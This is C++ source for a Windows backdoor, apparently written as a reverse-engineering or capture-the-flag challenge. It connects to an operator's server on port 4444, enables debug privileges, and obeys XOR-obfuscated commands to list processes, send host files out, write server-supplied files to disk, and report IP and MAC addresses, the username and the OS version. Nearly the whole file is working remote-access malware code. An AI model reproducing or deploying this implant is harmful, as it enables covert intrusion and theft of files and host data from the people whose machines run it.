#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <lmcons.h>
#include <vector>
#include <stack>
#include <queue>
#include <iostream>
#include <fstream>
#include <string>
#include <sstream>

#define DEFAULT_BUFLEN 1024
#define DEFAULT_PORT "4444"
#define MAX_PROCS 1024

typedef std::vector<int> vi;

char *commands[6] = {"GiveMeProcesses", "DownloadMyFile", "UploadThisFile", "GiveMeInfo", "Yeet", "exit"};
char recvbuf[DEFAULT_BUFLEN];
SOCKET ourSock;
std::string dataToSend;

bool visited[DEFAULT_BUFLEN];
int maxDepth = 0;
std::vector<vi> G;
int idx = 0;

char *NotKey = "MuchReversingButThisIsNotTheKeyHeheMuchReversingButThisIsNotTheKeyHehe";
char *KeyFile = "graph.txt";

// === Graph Theory Magic ===

void WeInitGraph() {
	std::ifstream inp(KeyFile);
	std::string line;
	while (std::getline(inp, line)) {
		vi gu = vi();
		for (unsigned int i = 0; i < line.length(); i++) {
			if (line[i] == '1') {
				gu.push_back(i);
			}
		}
		G.push_back(gu);
	}
}

void WeDFS(int u, char *data, int stop) {
	if (idx + 1 >= stop) {
		return;
	}

	if (visited[u]) {
		return;
	}

	idx += 1;
	data[idx] ^= NotKey[u % strlen(NotKey)];
	visited[u] = true;
	for (unsigned int i = 0; i < G[u].size(); i++) {
		int v = G[u][i];
		if (visited[v]) {
			continue;
		}
		
		WeDFS(v, data, stop);
	}
}

// === End Graph Theory Magic ===

// === Secret Crypto Magic ===

void WeEncryptOrWeDecrypt(char *data, int length) {
	int nBytesProcessed = 0;
	char *ptr = data;
	while (nBytesProcessed < length) {
		memset(visited, 0, sizeof(visited));
		idx = -1;
		WeDFS(0, ptr, length - nBytesProcessed);
		if (idx == -1) {
		} else {
			ptr += idx + 1;
			nBytesProcessed += idx + 1;
		}
	}
}

// === End Secret Crypto Magic ===

// === Socket Magic ===

int WeSendData(std::string data, SOCKET sock) {
	int allocLen = max(DEFAULT_BUFLEN, data.length() + 1);
	 printf("Data length: %d\n", data.length());
	char *cdata = (char *)malloc(allocLen);
	memcpy(cdata, data.c_str(), data.length());
	cdata[data.length()] = 0;
	WeEncryptOrWeDecrypt(cdata, data.length());
	send(sock, "yeeted", strlen("yeeted"), 0);
	int iResult = send(sock, cdata, data.length(), 0);
	if (iResult == SOCKET_ERROR) {
		printf("send failed with error: %x\n", WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return 1;
	}
	memset(cdata, 0, allocLen);
	strcpy(cdata, "yeeted");
	send(sock, cdata, allocLen, 0);
	free(cdata);
	return iResult;
}

int WeRecvData(char *&cdata, SOCKET sock) {
	std::string yeet = "";
	bool isYeeted = false;

	while (true) {
		memset(recvbuf, 0, sizeof(recvbuf));
		int iResult = recv(ourSock, recvbuf, DEFAULT_BUFLEN - 1, 0);

		if (iResult > 0) {
			yeet += std::string(recvbuf, iResult);
			int yeetidx = yeet.find("yeeted");
			if (yeetidx != -1) {
				if (isYeeted)  {
					yeet.erase(yeetidx);
					break;
				}
				else {
					yeet.erase(0, yeetidx + strlen("yeeted"));
					isYeeted = true;
				}
			}
		}
		else if (iResult == 0) {
			printf("Connection closing...\n");
		}
		else  {
			printf("recv failed with error: %d\n", WSAGetLastError());
			closesocket(ourSock);
			WSACleanup();
			exit(1);
		}
	}

	// printf("Yeet length: %d\n", yeet.length());
	cdata = (char *)malloc(yeet.length() + 1);
	memcpy(cdata, yeet.c_str(), yeet.length());
	WeEncryptOrWeDecrypt(cdata, yeet.length());
	cdata[yeet.length()] = 0;
}

int WeInitSocket(char *ipaddr, SOCKET *sock) {
	WSADATA wsaData;
	struct addrinfo *result = NULL, hints;

	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %x\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	iResult = getaddrinfo(ipaddr, DEFAULT_PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %x\n", iResult);
		WSACleanup();
		return 1;
	}

	SOCKET ConnectSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (ConnectSocket == INVALID_SOCKET) {
		printf("socket failed with error: %x\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	char *sndbuf = "\0\0\0\0";
	setsockopt(ConnectSocket, SOL_SOCKET, SO_SNDBUF, sndbuf, 4);

	iResult = connect(ConnectSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);
	*sock = ConnectSocket;
	return 0;
}

int WeShutdownSocket(SOCKET sock) {
	closesocket(sock);
	WSACleanup();
	return 0;
}

// === End Socket Magic ===

// === Get Processes ===

void WeGetOneProcess(DWORD processID) {
	char szProcessName[MAX_PATH] = "<unknown>";
	char data[DEFAULT_BUFLEN];
	
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
	memset(data, 0, sizeof(data));

	if (NULL != hProcess) {
		HMODULE hMod;
		DWORD cbNeeded;

		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
			if (!GetModuleBaseNameA(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(char))) {
				printf("GetModuleBaseName failed: %x\n", GetLastError());
			}
		}
		else {
			printf("EnumProcessModules failed: %x\n", GetLastError());
		}
	}
	else {
		printf("OpenProcess failed: %x\n", GetLastError());
	}
	
	sprintf_s(data, "%s  (PID: %u)\n", szProcessName, processID);
	dataToSend += std::string(data);
	CloseHandle(hProcess);
}

void WeGetPriv() {
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tokenPriv;
	LUID luidDebug;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_READ, &hToken)) {
		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidDebug)) {
			tokenPriv.PrivilegeCount = 1;
			tokenPriv.Privileges[0].Luid = luidDebug;
			tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, 0, NULL, NULL)) {
				printf("AdjustTokenPrivileges failed: %x\n", GetLastError());
			}
		}
	}
}

int WeGetProcesses(void) {
	dataToSend = "";
	DWORD aProcesses[MAX_PROCS], cbNeeded, cProcesses;

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
		printf("EnumProcesses failed: %x\n", GetLastError());
		return 1;
	}

	cProcesses = cbNeeded / sizeof(DWORD);

	for (unsigned int i = 0; i < cProcesses; i++) {
		if (aProcesses[i] != 0) {
			WeGetOneProcess(aProcesses[i]);
		}
	}
	
	WeSendData(dataToSend, ourSock);
	return 0;
}

// === End Get Processes ===

// === Download Upload Files ===

int WeDownloadFileFromURL() {
	return 0;
}

int WeDownloadFileFromServer() {
	char *filename;
	WeRecvData(filename, ourSock);
	puts(filename);

	char *filesize;
	WeRecvData(filesize, ourSock);
	unsigned long fsize = atoi(filesize);
	printf("File size: %lu\n", fsize);

	char *data;
	WeRecvData(data, ourSock);

	FILE *fp = fopen(filename, "wb");
	if (fp == NULL) {
		printf("fopen error\n");
	}
	fwrite((void *)data, 1, fsize, fp);
	fclose(fp);

	free(filename);
	free(filesize);
	free(data);
	return 0;
}

int WeUploadFile() {
	char *filename;
	WeRecvData(filename, ourSock);

	FILE *fp = fopen(filename, "rb");
	fseek(fp, 0, SEEK_END);
	unsigned long filesize = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	char *data = (char *)malloc(filesize);
	fread(data, 1, filesize, fp);
	fclose(fp);

	std::stringstream ss;
	ss << filesize;
	WeSendData(ss.str(), ourSock);

	WeSendData(std::string(data, filesize), ourSock);
	return 0;
}

// === End Download Upload Files ===

// === Get Host Information ===

int WeGetIPAndMACAddresses() {
	ULONG buflen = 3000;
	IP_ADAPTER_INFO *pAdapterInfo = (IP_ADAPTER_INFO *)malloc(buflen);
	IP_ADAPTER_INFO *ptr = NULL;
	GetAdaptersInfo(pAdapterInfo, &buflen);
	ptr = pAdapterInfo;
	while (ptr) {
		char *data = (char *)malloc(DEFAULT_BUFLEN);
		memset(data, 0, DEFAULT_BUFLEN);
		sprintf(data, "IP: %s - MAC: ", ptr->IpAddressList.IpAddress.String);
		dataToSend += std::string(data);
		for (unsigned int i = 0; i < ptr->AddressLength; i++) {
			if (i == (ptr->AddressLength - 1))
				sprintf(data, "%.2X\n", (int)ptr->Address[i]);
			else
				sprintf(data, "%.2X-", (int)ptr->Address[i]);
			dataToSend += std::string(data);
		}
		free(data);
		ptr = ptr->Next;
	}
	free(pAdapterInfo);
	return 0;
}

int WeGetUsername() {
	DWORD unameLen = UNLEN + 1;
	char *uname = (char *)malloc(unameLen);
	GetUserNameA(uname, &unameLen);
	char *data = (char *)malloc(DEFAULT_BUFLEN);
	memset(data, 0, DEFAULT_BUFLEN);
	sprintf(data, "Username: %s\n", uname);
	dataToSend += std::string(data);
	return 0;
}

int WeGetOS() {
	OSVERSIONINFOEXA OSInfo;
	memset(&OSInfo, 0, sizeof(OSVERSIONINFOEXA));
	OSInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
	GetVersionExA((OSVERSIONINFOA *) &OSInfo);
	
	bool MajorVer10 = OSInfo.dwMajorVersion == 10;
	bool MajorVer6 = OSInfo.dwMajorVersion == 6;
	bool MajorVer5 = OSInfo.dwMajorVersion == 5;
	
	bool MinorVer0 = OSInfo.dwMinorVersion == 0;
	bool MinorVer1 = OSInfo.dwMinorVersion == 1;
	bool MinorVer2 = OSInfo.dwMinorVersion == 2;
	bool MinorVer3 = OSInfo.dwMinorVersion == 3;
	
	bool isNT = OSInfo.wProductType == VER_NT_WORKSTATION;

	if (MajorVer6 && MinorVer1 && isNT) {
		dataToSend += "Windows 7";
	}
	else {
		dataToSend += "unsupported";
	}

	dataToSend += '\n';
	return 0;
}

int WeGetHostInformation() {
	dataToSend = "";
	WeGetIPAndMACAddresses();
	WeGetUsername();
	WeGetOS();
	WeSendData(dataToSend, ourSock);
	return 0;
}

// === End Get Host Information ===

int main(int argc, char **argv) {

	WeInitGraph();
	WeInitSocket(argv[1], &ourSock);
	WeGetPriv();

	while (true) {
		printf("Yeeting...\n");
		char *cmd;
		WeRecvData(cmd, ourSock);
		puts(cmd);
		if (!strncmp(cmd, commands[0], strlen(commands[0]))) {
			WeGetProcesses();
		} else if (!strncmp(cmd, commands[1], strlen(commands[1]))) {
			WeDownloadFileFromServer();
		} else if (!strncmp(cmd, commands[2], strlen(commands[2]))) {
			WeUploadFile();
		} else if (!strncmp(cmd, commands[3], strlen(commands[3]))) {
			WeGetHostInformation();
		} else if (!strncmp(cmd, commands[5], strlen(commands[5]))) {
			exit(0);
		} else {
			WeSendData(std::string("yeeted"), ourSock);
		}
		free(cmd);
	}
}